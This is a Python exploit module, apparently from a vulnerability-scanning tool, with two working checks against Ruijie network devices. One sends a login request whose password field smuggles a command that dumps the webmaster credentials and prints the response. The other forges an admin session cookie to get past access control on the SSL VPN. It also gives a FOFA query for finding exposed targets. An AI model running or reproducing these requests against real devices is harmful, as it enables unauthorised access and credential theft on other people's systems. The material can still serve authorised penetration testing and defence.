# -*- coding:UTF-8 -*-
from lib.util.exprequest import ExpRequest
from lib.util.output import Output
from lib.util.fun import *
import lib.util.globalvar as GlobalVar
import prettytable as pt
"""
+----------------+-------------+-----------------------------------------------------------------+
| Target type    | Vuln Name   | Impact Version && Vulnerability description                     |
+----------------+-------------+-----------------------------------------------------------------+
| ruijie SSL VPN | [privilege] | https://blog.csdn.net/weixin_43526443/article/details/114284015 |
+----------------+-------------+-----------------------------------------------------------------+
"""
class ruijie():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.flag = GlobalVar.get_value('flag')
            
    def Ruijie_EG_Easy_Gateway(self):
        fofa = 'app="Ruijie-EG易网关"'
        appName = 'ruijie'
        pocname = 'Ruijie_EG_Easy_Gateway'
        path ="/login.php"
        method = 'post'
        data = 'username=admin&password=admin?show+webmaster+user'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':              
                r = exprequest.post(url=self.url+path, data=data)
                if "admin" in r.text and r.status_code == 200:
                    return output.echo_success(method)
                return output.fail()
            else:
                r = exprequest.post(url=self.url+path, data=data)
                print(r.text)
        except Exception as error:
            return output.error_output(str(error))
        
    def ssl_vpn_privilege(self):
        appName = 'ruijie'
        pocname = 'ssl_vpn_privilege'
        path ="/cgi-bin/main.cgi?oper=getrsc"
        method = 'get'
        headers={"cookie":"UserName=admin; SessionId=1; FirstVist=1; Skin=1; tunnel=1"}
        desc = '越权'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':              
                r = exprequest.get(url=self.url+path, headers=headers)
                res = r.text
                if res.find('主机和子网资源') != -1:
                    return output.echo_success(method, desc)
                return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

def check(**kwargs):
    thread_list = []
    ExpRuijie = ruijie(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpRuijie, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(ruijie):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpRuijie, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)